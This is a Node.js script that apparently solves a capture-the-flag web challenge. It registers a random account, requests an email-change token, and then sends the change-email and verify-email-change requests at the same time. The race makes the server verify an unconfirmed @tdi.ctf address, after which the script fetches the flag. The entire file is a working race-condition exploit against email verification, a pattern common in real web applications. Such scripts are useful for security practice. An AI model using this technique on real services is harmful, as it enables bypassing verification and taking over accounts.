let axios = require('axios');

const httpAgent = new require('http').Agent({ keepAlive: true });

const baseUrl = process.argv[2];

axios = axios.create({
    httpAgent
});

let username = '';
let cookie = '';
let possibleChars = 'abcefghjklmnopqrsuvwxyzABDEGHIJKLMNOPQRSUVWXYZ0123456789';

// Register a random username
async function register() {
    const charactersLength = possibleChars.length;
    for (let i = 0; i < 10; i++) {
       username += possibleChars.charAt(Math.floor(Math.random() * charactersLength));
    }
    console.log('Registering with random username ' + username);
    try {
        const response = await axios({
            method: 'post',
            url: baseUrl + '/api/register',
            data: `username=${username}&password=${username}&passwordtoo=${username}&email=${username}@something.com`,
            maxRedirects: 0
        });
        console.log('--Registered', response.data);
    } catch (err) {
        console.error(err);
    }
}

// Login to our newly generated username
async function login() {
    console.log('Logging in...')
    try {
        const response = await axios({
            method: 'post',
            url: baseUrl + '/api/login',
            data: `username=${username}&password=${username}`,
            maxRedirects: 0
        });
        cookie = response.headers['set-cookie'][0].split(';')[0];
        if (response.data.success === false) {
            console.error('Error logging in');
            process.exit(1);
        } else {
            console.log("--Logged in, got cookie: " + cookie, response.data);
        }
    } catch (err) {
        console.error(err);
    }
}

async function getEmailToken() {
    console.log('Getting email token...');
    try {
        const response = await axios({
            method: 'post',
            url: baseUrl + '/api/change-email',
            data: `email=${username}@somethingelse.com`,
            maxRedirects: 0,
            headers: {
                Cookie: cookie
            },
        });
        if (response.data.success === false) {
            console.error('Error changing email');
            process.exit(1);
        } else {
            console.log("--Email change successful", response.data);
            return response.data.token;
        }
    } catch (err) {
        console.error(err);
    }
}

async function attemptRaceCondition(token) {
    console.log('Attempting race condition...');
    let responses =  await Promise.all([
        axios({
            method: 'post',
            url: baseUrl + '/api/change-email',
            data: `email=${username}@tdi.ctf`,
            maxRedirects: 0,
            headers: {
                Cookie: cookie
            },
        }),
        axios({
            method: 'post',
            url: baseUrl + '/api/verify-email-change',
            data: `token=${token}`,
            maxRedirects: 0,
            headers: {
                Cookie: cookie
            },
        })
    ]);
    console.log('Response1:', responses[0].data);
    console.log('Response2:', responses[1].data);
}

async function dontAttemptRaceCondition(token) {
    await axios({
        method: 'post',
        url: baseUrl + '/api/change-email',
        data: `email=${username}@tdi.ctf`,
        maxRedirects: 0,
        headers: {
            Cookie: cookie
        },
    });
    await axios({
        method: 'post',
        url: baseUrl + '/api/verify-email-change',
        data: `token=${token}`,
        maxRedirects: 0,
        headers: {
            Cookie: cookie
        },
    })
}

async function getUserInfo() {
    console.log('Retrieving user info');
    try {
        const response = await axios({
            method: 'get',
            url: baseUrl + '/api/user-info',
            headers: {
                Cookie: cookie
            },
        });
        console.log('--User info', response.data);
        return response.data;
    } catch (err) {
        console.error(err);
    }
}

async function doStuffAsync() {
    await register();
    await login();
    //while (true) {
        let token = await getEmailToken();
        if (!process.argv[3]) {
            await attemptRaceCondition(token);
        } else {
            await dontAttemptRaceCondition(token);
        }
        let userInfo = await getUserInfo();
        if (userInfo.email.includes('@tdi.ctf')) {
            const response = await axios({
                method: 'get',
                url: baseUrl + '/api/flag',
                headers: {
                    Cookie: cookie
                },
            });
            console.log(response.data);
            process.exit(0);
        } else {
            console.log('Failure');
        }
    //}
}

doStuffAsync();